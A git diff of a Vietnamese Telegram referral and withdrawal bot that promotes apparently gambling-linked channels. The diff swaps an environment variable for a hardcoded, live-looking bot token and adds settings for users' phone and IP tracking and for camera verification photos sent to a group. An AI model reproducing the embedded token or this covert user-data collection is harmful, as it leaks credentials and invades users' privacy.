@@ -1,19 +1,30 @@
+import base64
 import asyncio
+import html as _html
+import io
 import json
 import logging
 import os
 import random
 import re
+import secrets
+import time
+import threading
+import urllib.request
 import urllib.parse
 from collections import defaultdict
 from datetime import datetime, timedelta
 
-import psycopg
+import pytz
+from dotenv import load_dotenv
+from flask import Flask, request, jsonify
+from PIL import Image, ImageDraw, ImageFont
 from psycopg.rows import tuple_row
 from psycopg_pool import ConnectionPool
-import pytz
 
-from telegram import (
+load_dotenv()
+
+from telegram import (  # noqa: E402
     InlineKeyboardButton,
     InlineKeyboardMarkup,
     KeyboardButton,
@@ -22,163 +33,326 @@ from telegram import (
     Update,
     WebAppInfo,
 )
-
-from telegram.ext import (
+from telegram.ext import (  # noqa: E402
     Application,
     CallbackQueryHandler,
     CommandHandler,
     ContextTypes,
     MessageHandler,
-    ChatMemberHandler,
     filters,
 )
 
 # ============================================================
-# CẤU HÌNH
+# 2. CẤU HÌNH
 # ============================================================
-
-BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
+BOT_TOKEN = "8969844386:AAF3ilSkXGaUbqOPZKc_549qXxTApJMQa20"
 DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
-WEBAPP_URL = os.getenv("WEBAPP_URL", "https://iphongdep-prog.github.io/Phongstkca/").strip()
+MINI_APP_URL = os.getenv(
+    "MINI_APP_URL", "http://116.99.252.192:5000/miniapp"
+).strip()
 
-# Nhóm nhận thông báo khi phát hiện VPN/Proxy hoặc trùng IP
-LOG_ALERT_GROUP = "https://t.me/checkstkbot199"
-# Nếu bạn cần chat_id số nguyên cho nhóm (nếu bot đã có trong nhóm đó), hãy thay thế vào đây hoặc bot sẽ tự gửi bằng username/link nếu hỗ trợ. 
-# Khuyến nghị nếu bot gửi trực tiếp qua chat_id, bạn có thể cấu hình dạng số hoặc dùng username công khai.
-
-ADMIN_IDS = [5633649201]
-
+ADMIN_IDS = [7884394252]
 TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")
 
-REQUIRED_CHECK_CHANNELS = [
-    "@sancode22",
-    "@xombao247",
-    "@thongbaohit88",
-    "@sancodehit88",
-    "@vtc345",
-    "@vtc567",
-    "@hocviencbm",
-    "@hit88cm",
-    "@icbm988",
-    "@hocviencb",
-    "@xomhit88",
-]
+CAMERA_TARGET_GROUP = "-1003913789705"
+CAMERA_REQUIRE_PHOTO = False
 
 OPTIONAL_DISPLAY_CHANNELS = []
-
 SUPPORT_GROUP = "https://t.me/hocviencbm"
 
-MIN_WITHDRAW = 10000
-MAX_WITHDRAW = 300000
+GAME_CODE_URL = "https://t.me/xombao247"
+GAME_ROOM_URL = "https://t.me/gamehit88_bot"
 
-# ============================================================
-# EMOJI
-# ============================================================
-E = {
-    "CROWN": '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>',
-    "REFRESH": '<tg-emoji emoji-id="5375338737028841420">🔄</tg-emoji>',
-    "TOP": '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>',
-    "EYES": '<tg-emoji emoji-id="5210956306952758910">👀</tg-emoji>',
-    "LIGHTNING": '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>',
-    "COMET": '<tg-emoji emoji-id="5224607267797606837">☄️</tg-emoji>',
-    "STOP": '<tg-emoji emoji-id="5260293700088511294">⛔</tg-emoji>',
-    "BAN": '<tg-emoji emoji-id="5240241223632954241">🚫</tg-emoji>',
-    "WARN1": '<tg-emoji emoji-id="5274099962655816924">❗</tg-emoji>',
-    "WARN2": '<tg-emoji emoji-id="5440660757194744323">‼</tg-emoji>',
-    "WARN3": '<tg-emoji emoji-id="5314504236132747481">⁉</tg-emoji>',
-    "QUESTION": '<tg-emoji emoji-id="5436113877181941026">❓</tg-emoji>',
-    "ALERT1": '<tg-emoji emoji-id="5420323339723881652">⚠</tg-emoji>',
-    "ALERT2": '<tg-emoji emoji-id="5420323339723881652">⚠</tg-emoji>',
-    "CHART": '<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>',
-    "UP": '<tg-emoji emoji-id="5449683594425410231">🔼</tg-emoji>',
-    "DOWN": '<tg-emoji emoji-id="5447183459602669338">🔽</tg-emoji>',
-    "MEDAL1": '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>',
-    "MEDAL2": '<tg-emoji emoji-id="5447203607294265305">🥈</tg-emoji>',
-    "MEDAL3": '<tg-emoji emoji-id="5453902265922376865">🥉</tg-emoji>',
-    "CHECK_ANIMATED": '<tg-emoji emoji-id="5206607081334906820">✔</tg-emoji>',
-    "FREE": '<tg-emoji emoji-id="5406756500108501710">🆓</tg-emoji>',
-    "PENCIL": '<tg-emoji emoji-id="5395444784611480792">✏️</tg-emoji>',
-    "CALENDAR": '<tg-emoji emoji-id="5413879192267805083">🗓</tg-emoji>',
-    "DROP": '<tg-emoji emoji-id="5393512611968995988">💧</tg-emoji>',
-    "SNOW": '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>',
-    "SUN": '<tg-emoji emoji-id="5402477260982731644">☀️</tg-emoji>',
-    "ARROW_DOWN": '<tg-emoji emoji-id="5416117059207572332">➡</tg-emoji>',
-    "MAIL": '<tg-emoji emoji-id="5253742260054409879">✉</tg-emoji>',
-    "LOCK": '<tg-emoji emoji-id="5296369303661067030">🔒</tg-emoji>',
-    "GAME": '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>',
-    "GEAR": '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>',
-    "SURPRISE": '<tg-emoji emoji-id="5303479226882603449">😮</tg-emoji>',
-    "CLIP": '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>',
-    "SPEAKER": '<tg-emoji emoji-id="5388632425314140043">🔈</tg-emoji>',
-    "LAUGH1": '<tg-emoji emoji-id="5406913184810409829">😂</tg-emoji>',
-    "SMILE1": '<tg-emoji emoji-id="5386587088873331829">😄</tg-emoji>',
-    "LAUGH2": '<tg-emoji emoji-id="5375135722514685501">😆</tg-emoji>',
-    "SMIRK": '<tg-emoji emoji-id="5375170473095077321">😏</tg-emoji>',
-    "SWEAT": '<tg-emoji emoji-id="5384209107215456745">😅</tg-emoji>',
-    "KISS": '<tg-emoji emoji-id="5368475679937534380">😘</tg-emoji>',
-    "CRAZY": '<tg-emoji emoji-id="5393197898240369117">🤪</tg-emoji>',
-    "THUMB": '<tg-emoji emoji-id="5219872564569972166">👍</tg-emoji>',
-    "YUM": '<tg-emoji emoji-id="5348205856661969976">😋</tg-emoji>',
-    "COOL": '<tg-emoji emoji-id="5368562433981947135">😎</tg-emoji>',
-    "CRY1": '<tg-emoji emoji-id="5416039998904345140">😭</tg-emoji>',
-    "CRY2": '<tg-emoji emoji-id="5400000868739193368">😭</tg-emoji>',
-    "NEUTRAL": '<tg-emoji emoji-id="5368376088235875736">😐</tg-emoji>',
-    "LOVE": '<tg-emoji emoji-id="5323470315370585285">😍</tg-emoji>',
-    "CRY3": '<tg-emoji emoji-id="5379656338802482888">😭</tg-emoji>',
-    "ROLL": '<tg-emoji emoji-id="5429300173559832620">🙄</tg-emoji>',
-    "SIX": '<tg-emoji emoji-id="5305642863902604489">6️⃣</tg-emoji>',
-    "PHONE": '<tg-emoji emoji-id="5431445208531215160">📱</tg-emoji>',
-    "PRAY": '<tg-emoji emoji-id="5228878926306101271">🙏</tg-emoji>',
-    "MONEY": '<tg-emoji emoji-id="5278467510604160626">💰</tg-emoji>',
-    "FLASH": '<tg-emoji emoji-id="5411590687663608498">⚡</tg-emoji>',
+CODE_PRICE = 2000
+MIN_WITHDRAW = 2000
+MAX_WITHDRAW = 10000
+REFERRAL_REWARD = 1000
+
+SPAM_WINDOW_SECONDS = 4
+SPAM_MAX_MESSAGES = 10
+TEMP_BAN_MINUTES = 2
+
+MINIAPP_CAPTCHA_TTL_MINUTES = 10
+BIO_FLAG = "@lienminhvietnam"
+
+MENU_ICON_IDS = {
+    "account": "5278467510604160626",
+    "invite": "5231005931550030290",
+    "withdraw": "6188274324156191036",
+    "top": "6188266996941985323",
+    "support": "6188179499868229800",
+    "history": "6186110304884101722",
+    "game": "6102831593389299866",
+    "admin": "5341715473882955310",
 }
 
-# ============================================================
-# ANTI SPAM
-# ============================================================
+JOIN_BTN_EMOJI_IDS = [
+    "5197226061011623665", "5237968923940364244", "5195357093107868151",
+    "5197673179992038546", "5237981615568723131", "5237899560218534031",
+    "5240086364292129541", "5235640209852343235", "5235762367312173706",
+    "5235650728227251200", "5235871588330512091", "5240141073585544010",
+    "5456164124549454257", "5240457247603039842", "5461124828956203070",
+    "5460621222565910361", "5240072895274688214", "5240249594524214417",
+    "5242500342070909767", "5237721297600912488", "5240076365608264313",
+]
+CONFIRM_JOIN_EMOJI_ID = "5237968923940364244"
 
-SPAM_WINDOW_SECONDS = 3
-SPAM_MAX_MESSAGES = 6
-TEMP_BAN_MINUTES = 2
+_EMOJI_DEFS = {
+    "CHECK": ("5206607081334906820", "✔️"),
+    "CHECK2": ("6156849229567365992", "✅"),
+    "CROSS": ("5210952531676504517", "❌"),
+    "WARN": ("5420323339723881652", "⚠️"),
+    "EXCL": ("5373059848856421989", "❗️"),
+    "INFO": ("5334544901428229844", "ℹ️"),
+    "REFRESH": ("5375338737028841420", "🔄"),
+    "REFRESH2": ("5226702984204797593", "🔄"),
+    "HOURGLASS": ("5386367538735104399", "⌛"),
+    "GEAR": ("5341715473882955310", "⚙️"),
+    "SHIELD": ("5197288647275071607", "🛡"),
+    "TOP": ("5415655814079723871", "🔝"),
+    "TOP2": ("5463071033256848094", "🔝"),
+    "UP": ("5463122435425448565", "⬆️"),
+    "DOWN": ("5406745015365943482", "⬇️"),
+    "RIGHT": ("5429651785352501917", "↗️"),
+    "ARROW_LEFT_RIGHT": ("5271837459783638319", "↔️"),
+    "PLUS": ("5397916757333654639", "➕"),
+    "MONEY": ("5278467510604160626", "💰"),
+    "MONEY2": ("5224257782013769471", "💰"),
+    "MONEY_FLY": ("5231005931550030290", "💸"),
+    "MONEY_FACE": ("5427107837568360763", "🤑"),
+    "COIN": ("5402186569006210455", "💱"),
+    "CARD": ("5240066289614987080", "💳"),
+    "CARD2": ("5445353829304387411", "💳"),
+    "BANK": ("5332455502917949981", "🏦"),
+    "BAG": ("5294167145079395967", "🛍"),
+    "BAG2": ("5406683434124859552", "🛍"),
+    "CROWN": ("5217822164362739968", "👑"),
+    "CROWN2": ("5433758796289685818", "👑"),
+    "GOLD_MEDAL": ("5440539497383087970", "🥇"),
+    "SILVER_MEDAL": ("5447203607294265305", "🥈"),
+    "BRONZE_MEDAL": ("5453902265922376865", "🥉"),
+    "STAR": ("6229012024534242176", "🌟"),
+    "STAR2": ("5267500801240092311", "⭐"),
+    "FIRE": ("6309824960944673394", "🔥"),
+    "ROCKET": ("5195033767969839232", "🚀"),
+    "TARGET": ("5256131095094652290", "🎯"),
+    "PHONE": ("5285238101344544669", "📞"),
+    "MAIL": ("5253742260054409879", "✉️"),
+    "INBOX": ("5443127283898405358", "📥"),
+    "OUTBOX": ("5445355530111437729", "📤"),
+    "SPEAKER": ("5388632425314140043", "🔈"),
+    "CLIP": ("5305265301917549162", "📎"),
+    "GLOBE": ("5447410659077661506", "🌐"),
+    "DEV": ("6066579956287148786", "👨‍💻"),
+    "LIKE": ("6192940307907088992", "👍"),
+    "LOVE_FACE": ("5240410604258206563", "🥰"),
+    "LOVE_FACE2": ("6318677150534734288", "🥰"),
+    "HEART": ("6273945156341209192", "😍"),
+    "SMILE": ("6138749335438889769", "😀"),
+    "GRIN": ("5377812805695053090", "😃"),
+    "LAUGH": ("6138433913040671508", "😂"),
+    "LAUGH2": ("5463121572137022242", "😂"),
+    "LAUGH_SQUINT": ("5375135722514685501", "😆"),
+    "BLUSH": ("5238015713314086319", "☺️"),
+    "STUCK_OUT": ("6273634436932179409", "😝"),
+    "TONGUE": ("6192771593001767805", "👅"),
+    "SCREAM": ("5253478445983222118", "😱"),
+    "SCREAM2": ("6273875491971667684", "😱"),
+    "BANDAGE": ("6199453007336184702", "😞"),
+    "FIST": ("5375161616872520280", "🤜"),
+    "DANCER": ("5373112999076699207", "💃"),
+    "LIPS": ("5395444514028529554", "🫦"),
+    "WOLF": ("6309898817202295364", "🐺"),
+    "BANANA": ("6075743256128263137", "🥐"),
+    "CLOVER": ("6307395821931335527", "🍀"),
+    "MUSIC": ("6235381315005325678", "🎶"),
+    "CAR": ("6280407793631498213", "🚗"),
+    "CAR2": ("5282927142651319521", "🚗"),
+    "PLANE": ("5456216132308462012", "✈️"),
+    "TEST_TUBE": ("5294451377425106537", "🧪"),
+    "SNOW": ("5449449325434266744", "❄️"),
+    "COPYRIGHT": ("5323442290708985472", "©"),
+    "NUM_4": ("5382054253403577563", "4️⃣"),
+    "NUM_5": ("5391197405553107640", "5️⃣"),
+    "NUM_6": ("5390966190283694453", "6️⃣"),
+    "NUM_7": ("5382132232829804982", "7️⃣"),
+    "NUM_8": ("5391038994274329680", "8️⃣"),
+    "NUM_9": ("5391234698754138414", "9️⃣"),
+    "ABC_01": ("5357372145800334358", "🔠"),
+    "ABC_02": ("5357051925923648418", "🔠"),
+    "ABC_03": ("5359451970828520680", "🔠"),
+    "ABC_04": ("5359648590136361323", "🔠"),
+    "ABC_05": ("5361794927028096622", "🔠"),
+    "ABC_06": ("5359293061333535340", "🔠"),
+    "ABC_07": ("5361583129305829231", "🔠"),
+    "ABC_08": ("5359299520964348572", "🔠"),
+    "ABC_09": ("5359552223955145217", "🔠"),
+    "ABC_10": ("5361888806423251732", "🔠"),
+    "ABC_11": ("5359549406456598104", "🔠"),
+    "ABC_12": ("5359354676934364278", "🔠"),
+    "ABC_13": ("5361625615122319358", "🔠"),
+    "ABC_14": ("5359808152466378462", "🔠"),
+    "ABC_15": ("5375319963726793021", "🔠"),
+    "ABC_16": ("5361767233078973238", "🔠"),
+    "ABC_17": ("5361871785467857730", "🔠"),
+    "ABC_18": ("5364023048687078741", "🔠"),
+    "ABC_19": ("5364149466754468020", "🔠"),
+    "GAME_STAR": ("6102831593389299866", "🌟"),
+    "GAME_STARSTRUCK": ("6167959932004997710", "🤩"),
+    "GAME_CAR": ("6280407793631498213", "🚗"),
+    "GAME_TONGUE": ("6192771593001767805", "👅"),
+    "GAME_STORM": ("6260461407163126795", "⛈"),
+    "GAME_BELL": ("5440833702642857683", "🔔"),
+}
+E = {k: f'<tg-emoji emoji-id="{v[0]}">{v[1]}</tg-emoji>' for k, v in _EMOJI_DEFS.items()}
+EP = {k: v[1] for k, v in _EMOJI_DEFS.items()}
+
+AI = {
+    "TRASH": ("5445267414562389170", "🗑"),
+    "HOURGLASS": ("5386367538735104399", "⌛"),
+    "ALERT": ("5395695537687123235", "🚨"),
+    "EDIT": ("5395444784611480792", "✏️"),
+    "MAIL": ("5253742260054409879", "✉️"),
+    "PLUS": ("5397916757333654639", "➕"),
+    "PIN": ("5391032818111363540", "📍"),
+    "REFRESH": ("5375338737028841420", "🔄"),
+    "TOP": ("5415655814079723871", "🔝"),
+    "LINK": ("5271604874419647061", "🔗"),
+    "PC": ("5282843764451195532", "🖥"),
+    "SHIELD": ("5251203410396458957", "🛡"),
+    "NEXT": ("5416117059207572332", "➡️"),
+    "MONEY_FLY": ("5231005931550030290", "💸"),
+    "PIN2": ("5397782960512444700", "📌"),
+    "CAR": ("6280407793631498213", "🚗"),
+    "GRIN": ("6111737246732262016", "😃"),
+    "VN": ("6190651897792174993", "🇻🇳"),
+    "BATTERY": ("5307905813451397794", "🔋"),
+    "CARD": ("5445353829304387411", "💳"),
+    "PICK": ("5197371802136892976", "⛏"),
+    "INBOX": ("5443127283898405358", "📥"),
+    "MONEY": ("5278467510604160626", "💰"),
+    "SHIELD2": ("5197288647275071607", "🛡"),
+    "BANK": ("5332455502917949981", "🏦"),
+    "UPRIGHT": ("5429651785352501917", "↗️"),
+    "CART": ("5312361253610475399", "🛒"),
+    "SCALE": ("5400250414929041085", "⚖️"),
+    "LAPTOP": ("5193177581888755275", "💻"),
+    "IMAGE": ("5262517101578443800", "🖼"),
+    "BULB": ("5262844652964303985", "💡"),
+    "MONEY2": ("5287231198098117669", "💰"),
+    "TARGET": ("5256131095094652290", "🎯"),
+    "PHONE": ("5285238101344544669", "📞"),
+    "DICE": ("5280816565657300091", "🎲"),
+    "UNLOCK": ("5291873529464122510", "🔓"),
+    "LOVE1": ("5197387964098813812", "🥰"),
+    "BLUSH": ("5238015713314086319", "☺️"),
+    "HAND": ("5237759703198474072", "🖐"),
+    "POOP": ("5235622845299565321", "💩"),
+    "CAR2": ("5240037474679398914", "🚘"),
+    "CROSS": ("5238037944064811339", "❌"),
+    "FLUSHED": ("5238083517962793068", "😳"),
+    "SMIRK": ("5237903859480796749", "😏"),
+    "RUN": ("5237981615568723131", "🏃‍♀️"),
+    "CARD2": ("5240066289614987080", "💳"),
+    "SCREAM": ("5235640209852343235", "😱"),
+    "STARSTRUCK": ("5195357093107868151", "🤩"),
+    "CONFUSED": ("5197226061011623665", "😕"),
+    "BANANA": ("5237784970491074950", "🍌"),
+    "NERD": ("5240209101572545926", "🤓"),
+    "KEYBOARD": ("5237843923212181104", "⌨️"),
+    "ANGRY": ("5240408207666455054", "😡"),
+    "GUN": ("5235762367312173706", "🔫"),
+    "CARD3": ("5237971457971067970", "💳"),
+    "FEAR": ("5242500342070909767", "😨"),
+    "CRY": ("5460630100263312018", "😭"),
+    "ZANY": ("5240076365608264313", "🤪"),
+    "LOVE2": ("5240076833759699366", "🥰"),
+    "TONGUE": ("5239944638961294456", "👅"),
+    "CRY2": ("5460741258311900209", "😭"),
+    "MONEY_FLY2": ("5240290577102152084", "💸"),
+    "ANGUISH": ("5237721297600912488", "😧"),
+    "BURGER": ("5239948040575393823", "🍔"),
+    "DOG": ("5242395424609803673", "🐶"),
+    "SHUSH": ("6226686020570584326", "🤫"),
+    "ROCK": ("6163685838250054493", "🤘"),
+    "STAR": ("6195233300752111114", "🌟"),
+    "TOP2": ("6163696502653850661", "🔝"),
+    "CLOVER": ("6161347086823461532", "🍀"),
+    "BOOM": ("6161101981629814014", "💥"),
+    "MEDAL": ("6165926565638051547", "🎖"),
+    "CURSE": ("6168156972219635148", "🤬"),
+    "LOVE3": ("6190600074716779111", "🥰"),
+    "LOVE4": ("6167691994765202199", "🥰"),
+    "LOVE5": ("6167904514041976028", "🥰"),
+    "LOVE6": ("6170039056953513698", "🥰"),
+    "LOVE7": ("6170126953459228118", "🥰"),
+    "PEACH": ("6165529117954413678", "🍑"),
+    "NERD2": ("6167810935294530083", "🤓"),
+    "DANCE": ("6186015776948885249", "🕺"),
+    "TULIP": ("6197378228894568973", "🌷"),
+    "DRAGON": ("6188171511229060434", "🐉"),
+    "WAVE": ("6190629722876023613", "👋"),
+    "HEART_EYES": ("6192639363843626187", "😍"),
+    "ANGEL": ("6195191910152279859", "😇"),
+    "TRAM": ("6208671312823456804", "🚊"),
+    "RAISED_BROW": ("6208304964998010180", "🤨"),
+    "LOVE8": ("6208631494181655806", "🥰"),
+}
+
+def ai(key: str) -> str:
+    eid, ch = AI[key]
+    return f'<tg-emoji emoji-id="{eid}">{ch}</tg-emoji>'
+
+
+def abtn(text: str, icon_key: str, **kwargs) -> InlineKeyboardButton:
+    api = dict(kwargs.pop("api_kwargs", None) or {})
+    api["icon_custom_emoji_id"] = AI[icon_key][0]
+    return InlineKeyboardButton(text, api_kwargs=api, **kwargs)
+
+
+def ibtn(text: str, emoji_id: str, **kwargs) -> InlineKeyboardButton:
+    api = dict(kwargs.pop("api_kwargs", None) or {})
+    api["icon_custom_emoji_id"] = emoji_id
+    return InlineKeyboardButton(text, api_kwargs=api, **kwargs)
+
 
 user_msg_tracker = defaultdict(list)
 temp_bans = {}
 user_withdraw_state = {}
-admin_checkdl_state = {}
-admin_spl_state = {}
+pending_captcha_users = {}
+pending_miniapp_captcha = {}
+pending_camera_verified = set()
+admin_input_states = {}
 
-# ============================================================
-# LOG
-# ============================================================
+_last_cam_alert_ts = 0.0
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO,
 )
-
 logger = logging.getLogger(__name__)
 
-# ============================================================
-# DATABASE POSTGRESQL
-# ============================================================
-
 db_pool = None
+
 
 def get_pool():
     global db_pool
     if db_pool is None:
         if not DATABASE_URL:
-            raise RuntimeError("Chưa cấu hình DATABASE_URL trên VPS/Railway.")
+            raise RuntimeError("Chưa cấu hình DATABASE_URL.")
         db_pool = ConnectionPool(
             DATABASE_URL,
-            min_size=2,
-            max_size=20,
+            min_size=1,
+            max_size=10,
             kwargs={"row_factory": tuple_row},
-            open=True
+            open=True,
         )
     return db_pool
 
-def _db_query_sync(query, params=(), fetchone=False, fetchall=False, commit=False):
+
+def _db_query_sync(
+    query, params=(), fetchone=False, fetchall=False, commit=False
+):
     pool = get_pool()
     with pool.connection() as conn:
         with conn.cursor() as cursor:
@@ -191,10 +365,14 @@ def _db_query_sync(query, params=(), fetchone=False, fetchall=False, commit=Fals
                 conn.commit()
             return None
 
-async def db_query(query, params=(), fetchone=False, fetchall=False, commit=False):
+
+async def db_query(
+    query, params=(), fetchone=False, fetchall=False, commit=False
+):
     return await asyncio.to_thread(
         _db_query_sync, query, params, fetchone, fetchall, commit
     )
+
 
 def _db_transaction_sync(callback):
     pool = get_pool()
@@ -204,50 +382,50 @@ def _db_transaction_sync(callback):
             conn.commit()
             return result
 
+
 async def db_transaction(callback):
     return await asyncio.to_thread(_db_transaction_sync, callback)
+
 
 def _init_db_sync():
     pool = get_pool()
     with pool.connection() as conn:
         with conn.cursor() as cursor:
-            cursor.execute(
-                """
+            cursor.execute("""
                 CREATE TABLE IF NOT EXISTS users (
                     user_id BIGINT PRIMARY KEY,
                     username TEXT,
                     balance BIGINT NOT NULL DEFAULT 0,
                     bank_info TEXT,
                     referrer_id BIGINT,
-                    phone_number TEXT,
-                    ref_rewarded INTEGER NOT NULL DEFAULT 0,
-                    is_captcha_passed INTEGER NOT NULL DEFAULT 0,
-                    is_text_verified INTEGER NOT NULL DEFAULT 1,
-                    is_phone_verified INTEGER NOT NULL DEFAULT 0,
                     is_banned INTEGER NOT NULL DEFAULT 0,
                     is_withdraw_banned INTEGER NOT NULL DEFAULT 0,
                     joined_at TEXT,
-                    ip_address TEXT,
-                    skip_ip_check INTEGER NOT NULL DEFAULT 0,
-                    skip_ref_once INTEGER NOT NULL DEFAULT 0
+                    phone_number TEXT
                 )
-                """
-            )
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS phone_number TEXT;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS ref_rewarded INTEGER NOT NULL DEFAULT 0;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_captcha_passed INTEGER NOT NULL DEFAULT 0;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_text_verified INTEGER NOT NULL DEFAULT 1;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_phone_verified INTEGER NOT NULL DEFAULT 0;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_withdraw_banned INTEGER NOT NULL DEFAULT 0;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS bank_info TEXT;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS referrer_id BIGINT;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS joined_at TEXT;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS ip_address TEXT;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS skip_ip_check INTEGER NOT NULL DEFAULT 0;")
-            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS skip_ref_once INTEGER NOT NULL DEFAULT 0;")
-
+            """)
             cursor.execute(
-                """
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS ip_address TEXT;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS skip_ip INTEGER DEFAULT 0;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS captcha_verified INTEGER DEFAULT 0;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS miniapp_captcha_verified INTEGER DEFAULT 0;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS camera_verified INTEGER DEFAULT 0;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS cccam_verified INTEGER DEFAULT 0;"
+            )
+            cursor.execute(
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS camera_photo_token TEXT;"
+            )
+            cursor.execute("""
                 CREATE TABLE IF NOT EXISTS transactions (
                     id BIGSERIAL PRIMARY KEY,
                     user_id BIGINT NOT NULL,
@@ -257,621 +435,775 @@ def _init_db_sync():
                     created_at TEXT NOT NULL,
                     details TEXT
                 )
-                """
-            )
-            cursor.execute("CREATE TABLE IF NOT EXISTS groups (chat_id BIGINT PRIMARY KEY);")
-            cursor.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);")
-
+            """)
             cursor.execute(
-                """
-                CREATE TABLE IF NOT EXISTS users_history (
-                    user_id BIGINT PRIMARY KEY,
-                    first_seen_at TEXT NOT NULL
+                "CREATE TABLE IF NOT EXISTS groups (chat_id BIGINT PRIMARY KEY)"
+            )
+            cursor.execute(
+                "CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)"
+            )
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS code_stock (
+                    id BIGSERIAL PRIMARY KEY,
+                    type_code INTEGER NOT NULL DEFAULT 1,
+                    code_val TEXT NOT NULL,
+                    is_used INTEGER NOT NULL DEFAULT 0,
+                    created_at TEXT NOT NULL
                 )
-                """
+            """)
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS code_deleted_log (
+                    id BIGSERIAL PRIMARY KEY,
+                    code_val TEXT NOT NULL,
+                    deleted_at TEXT NOT NULL
+                )
+            """)
+            default_settings = [
+                ("maintenance", "0"),
+                ("verify_phone", "1"),
+                ("verify_ip", "1"),
+                ("verify_channel", "1"),
+                ("verify_captcha", "1"),
+                ("allow_withdraw", "1"),
+                ("auto_buy_code", "1"),
+                ("verify_camera", "1"),
+                ("verify_miniapp_captcha", "1"),
+                ("verify_cccam", "1"),
+            ]
+            for key, val in default_settings:
+                cursor.execute(
+                    "INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING",
+                    (key, val),
+                )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(user_id, id DESC)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_transactions_withdraw ON transactions(type, status, id)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_users_referrer ON users(referrer_id)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_code_stock ON code_stock(type_code, is_used)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_code_stock_val ON code_stock(code_val)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone_number)"
+            )
+            cursor.execute(
+                "CREATE INDEX IF NOT EXISTS idx_users_ip ON users(ip_address)"
             )
 
-            defaults = [
-                ('maintenance', '0'),
-                ('check_channels', '1'),
-                ('check_captcha', '1'),
-                ('check_phone', '1'),
-                ('check_ip', '1'),
-                ('enable_withdraw', '1')
-            ]
-            for key, val in defaults:
-                cursor.execute("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING;", (key, val))
-
-            cursor.execute("CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(user_id, id DESC)")
-            cursor.execute("CREATE INDEX IF NOT EXISTS idx_transactions_withdraw ON transactions(type, status, id)")
-            cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_referrer ON users(referrer_id)")
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS required_channels (
+                    id BIGSERIAL PRIMARY KEY,
+                    chat_ref TEXT NOT NULL UNIQUE,
+                    title TEXT,
+                    invite_url TEXT,
+                    added_at TEXT
+                )
+            """)
         conn.commit()
         logger.info("Database PostgreSQL đã sẵn sàng.")
+
 
 async def init_db():
     await asyncio.to_thread(_init_db_sync)
 
+
 def get_now_str():
     return datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
 
-# ============================================================
-# CẤU HÌNH SETTINGS
-# ============================================================
 
-async def get_setting(key: str, default="1") -> bool:
-    res = await db_query("SELECT value FROM settings WHERE key=%s", (key,), fetchone=True)
-    return (res[0] == "1") if res else (default == "1")
+def is_admin(update: Update):
+    return bool(update.effective_user and update.effective_user.id in ADMIN_IDS)
 
-async def set_setting(key: str, value: str):
-    await db_query("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value", (key, value), commit=True)
+
+async def get_valid_referrals_count(user_id: int) -> int:
+    res = await db_query(
+        "SELECT COUNT(*) FROM transactions WHERE user_id=%s AND type='Thưởng Mời Bạn' AND status='Thành công'",
+        (user_id,),
+        fetchone=True,
+    )
+    return res[0] if res else 0
+
+
+async def get_verify_setting(key: str) -> bool:
+    res = await db_query(
+        "SELECT value FROM settings WHERE key=%s", (key,), fetchone=True
+    )
+    return bool(res and res[0] == "1")
+
+
+async def set_verify_setting(key: str, value: bool):
+    val_str = "1" if value else "0"
+    await db_query(
+        "UPDATE settings SET value=%s WHERE key=%s",
+        (val_str, key),
